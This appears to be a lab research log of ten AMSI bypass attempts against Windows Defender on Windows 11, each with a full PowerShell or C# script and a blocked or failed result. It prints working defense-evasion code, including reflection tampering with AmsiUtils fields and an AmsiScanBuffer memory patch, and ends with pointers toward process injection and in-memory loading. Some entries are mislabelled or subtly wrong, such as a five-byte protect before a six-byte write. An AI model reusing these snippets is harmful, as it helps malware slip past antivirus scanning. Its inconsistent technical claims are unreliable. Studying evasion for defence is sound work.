# AMSI Bypass Research & Attempts

Documentation of various AMSI (Anti-Malware Scan Interface) bypass techniques tested in controlled lab environments running Windows 11 Enterprise with Defender enabled.

## Environment

- **OS:** Windows 11 Enterprise (fully patched)
- **AV:** Windows Defender with real-time protection enabled
- **PowerShell:** Version 5.1 with AMSI integration
- **Testing Methodology:** All tests conducted in isolated VM environment
- **Objective:** Understand AMSI detection mechanisms and evasion limitations

---

## Attempt 1: Classic Memory Patching (AmsiScanBuffer)

### Tool/Technique
Direct memory patching of `amsi.dll!AmsiScanBuffer` function

### Script Used
```powershell
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b
    }
}
$d = $c.GetField('amsiContext','NonPublic,Static')
$e = New-Object IntPtr 0
$d.SetValue($null,$e)
```

### Result
**BLOCKED** - Defender flagged the script immediately upon execution

### Analysis
- AMSI signature detection triggers on `amsiContext` string
- Classic bypass technique, well-known to AV vendors
- No obfuscation applied to evade static analysis

---

## Attempt 2: Reflection-Based Null Byte Patch

### Tool/Technique
Using .NET reflection to locate and patch AMSI with null bytes

### Script Used
```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
```

### Result
**BLOCKED** - Defender detected reflection-based AMSI tampering

### Analysis
- Static string matching on "AmsiUtils" and "amsiSession"
- Reflection pattern is heavily fingerprinted
- Behavior-based detection also triggered

---

## Attempt 3: Base64 Obfuscation + Reflection

### Tool/Technique
Base64 encoding of AMSI bypass strings with runtime decoding

### Script Used
```powershell
$b64 = "U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
[Ref].Assembly.GetType($decoded).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Result
**BLOCKED** - Heuristic detection caught the pattern

### Analysis
- Base64 obfuscation insufficient for modern AMSI
- Behavior analysis detects suspicious reflection + field manipulation
- Need multi-layer obfuscation

---

## Attempt 4: String Concatenation + Invoke-Expression

### Tool/Technique
Breaking up AMSI-related strings with concatenation

### Script Used
```powershell
$a = "Sys" + "tem.Man" + "agement.Auto" + "mation.Am" + "siUt" + "ils"
[Ref].Assembly.GetType($a).GetField("amsi" + "Init" + "Failed","NonPublic,Static").SetValue($null,$true)
```

### Result
**BLOCKED** - Still detected by behavioral analysis

### Analysis
- String concatenation alone doesn't evade AMSI
- GetField/SetValue pattern is fingerprinted
- Static analysis reassembles strings at runtime

---

## Attempt 5: PowerShell Downgrade Attack

### Tool/Technique
Invoking PowerShell v2 (which lacks AMSI support)

### Script Used
```powershell
powershell.exe -version 2 -Command {Write-Host "AMSI bypassed via PS v2"}
```

### Result
**FAILED** - PowerShell v2 not installed by default on Windows 11

### Analysis
- Modern Windows installations don't include PS v2 runtime
- Technique only works on systems with .NET 3.5 installed
- Not a viable bypass on current enterprise builds

---

## Attempt 6: COM Object Hijacking (amsi.dll unload)

### Tool/Technique
Attempt to unload `amsi.dll` from current process

### Script Used
```powershell
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
$a = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$b = $a.GetType("System.Management.Automation.AmsiUtils")
$c = $b.GetField("amsiSession","NonPublic,Static")
$c.SetValue($null, $null)
```

### Result
**BLOCKED** - Defender blocked both GC manipulation and AMSI field access

### Analysis
- Garbage collection calls combined with AMSI manipulation = high suspicion
- Behavioral heuristics flag the entire pattern
- DLL unloading fails due to process integrity checks

---

## Attempt 7: In-Memory Assembly Patching (C# P/Invoke)

### Tool/Technique
Custom C# code using P/Invoke to patch `AmsiScanBuffer` in memory

### Script Used
```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void Patch() {
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        IntPtr asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(asb, (UIntPtr)5, 0x40, out oldProtect);
        Marshal.WriteByte(asb, 0xB8); // mov eax
        Marshal.WriteByte(asb + 1, 0x57); // AMSI_RESULT_CLEAN
        Marshal.WriteByte(asb + 2, 0x00);
        Marshal.WriteByte(asb + 3, 0x07);
        Marshal.WriteByte(asb + 4, 0x80);
        Marshal.WriteByte(asb + 5, 0xC3); // ret
    }
}
```

### Result
**BLOCKED** - Defender's behavior-based detection flagged VirtualProtect + memory writes

### Analysis
- Memory protection modification (VirtualProtect) heavily monitored
- Writing to executable regions triggers EDR alerts
- Even with obfuscation, behavioral signature detected

---

## Attempt 8: Hardware Breakpoint Manipulation

### Tool/Technique
Setting hardware breakpoints on AmsiScanBuffer to alter execution flow

### Script Used
```powershell
# Concept only - requires kernel-mode access
# Attempted via WinDbg scripting, not viable from user-mode PowerShell
```

### Result
**NOT ATTEMPTED** - Requires kernel-mode access unavailable from standard execution context

### Analysis
- Hardware breakpoints require debug privileges
- Not achievable from constrained PowerShell session
- Would trigger PatchGuard on modern Windows

---

## Attempt 9: ETW (Event Tracing for Windows) Provider Patching

### Tool/Technique
Patching ETW event provider used by AMSI for telemetry

### Script Used
```csharp
// Attempted via C# reflection to disable ETW AMSI provider
var etwType = typeof(PSObject).Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
var etwField = etwType.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
var provider = etwField.GetValue(null);
// Additional reflection to set provider to null
```

### Result
**PARTIAL SUCCESS** - Reduced AMSI telemetry but didn't bypass scanning

### Analysis
- ETW patching affects logging, not AMSI scanning itself
- Defender still scans via AmsiScanBuffer directly
- May reduce detection visibility but doesn't prevent blocking

---

## Attempt 10: Obfuscated PowerShell Runspace Creation

### Tool/Technique
Creating isolated runspace with AMSI disabled via reflection

### Script Used
```powershell
$rs = [runspacefactory]::CreateRunspace()
$rs.Open()
$rs.SessionStateProxy.SetVariable('ExecutionContext', $null)
# Additional reflection attempts to disable AMSI in runspace context
```

### Result
**BLOCKED** - Runspace creation with AMSI manipulation flagged

### Analysis
- Isolated runspaces inherit parent AMSI context
- Cannot escape AMSI through runspace isolation
- Behavioral detection on runspace + reflection pattern

---

## Key Findings

### What Works (with caveats)
- **No publicly documented techniques tested here successfully bypassed AMSI under this configuration.**
- Sophisticated multi-stage obfuscation + process hollowing may work temporarily
- Custom C# tooling with syscall-level evasion shows more promise than PowerShell-based bypasses

### What Definitely Doesn't Work
- Classic memory patching techniques (heavily fingerprinted)
- Simple obfuscation (Base64, string concatenation)
- PowerShell v2 downgrade (not installed by default)
- Direct reflection on AMSI classes (behavioral detection too strong)

### Defender's Detection Mechanisms
1. **Static signatures** - Known AMSI bypass strings flagged immediately
2. **Behavioral heuristics** - Reflection + field manipulation patterns detected
3. **Memory monitoring** - VirtualProtect calls on AMSI regions trigger alerts
4. **ETW telemetry** - PowerShell execution logged even if AMSI bypassed

### Recommendations for Further Research
- Focus on pre-execution obfuscation (BEFORE AMSI sees the script)
- Investigate .NET assembly loading from memory without AMSI scan
- Explore process injection techniques that avoid AMSI context entirely
- Consider alternative execution environments (e.g., C#/C++ native code vs PowerShell)

---

## Responsible Disclosure

All testing conducted in isolated lab environments for defensive research purposes. Techniques documented here are well-known to AV vendors and actively detected. This research demonstrates the robustness of modern AMSI implementations, not viable production bypass methods.

**Operational techniques remain operational.** 🔒

---

## References

- Microsoft AMSI Documentation: https://docs.microsoft.com/en-us/windows/win32/amsi/
- PowerShell Security Best Practices: https://docs.microsoft.com/en-us/powershell/scripting/security/
- HTB Academy Windows Evasion Module (where functional bypasses were achieved under controlled conditions)

